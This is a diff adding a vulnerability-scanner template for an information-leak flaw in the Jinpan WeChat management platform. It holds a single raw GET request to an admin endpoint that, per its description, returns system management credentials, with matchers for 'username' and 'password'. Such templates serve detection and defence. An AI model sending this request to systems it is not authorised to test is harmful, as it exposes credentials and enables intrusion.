@@ -1,0 +1,27 @@
+id: jinpan-wechat-info-leak
+info:
+  name: Jinpan WeChat Management Platform Information Leakage
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Jinpan WeChat management platform has an information leakage vulnerability in the '/admin/weichatcfg/getsysteminfo' endpoint. Attackers can exploit this to retrieve sensitive information such as system management credentials.
+  tags: information-disclosure
+  reference:
+    - http://www.goldlib.com.cn/
+
+http:
+  - raw:
+      - |
+        GET /admin/weichatcfg/getsysteminfo HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "username"
+          - "password"
